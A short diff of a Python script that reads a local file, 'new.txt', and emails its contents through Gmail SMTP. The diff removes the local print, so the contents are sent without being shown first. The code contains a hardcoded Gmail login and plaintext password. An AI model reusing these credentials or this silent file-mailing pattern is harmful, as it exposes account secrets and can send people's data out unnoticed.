@@ -4,8 +4,6 @@ message = "\n"
 f = open("new.txt", "rb")
 message += f.read()
 
-print(message)
-
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login("psylock2015@gmail.com", "petasse2015")
 server.sendmail("psylock2015@gmail.com", "doemae19@gmail.com", message) 
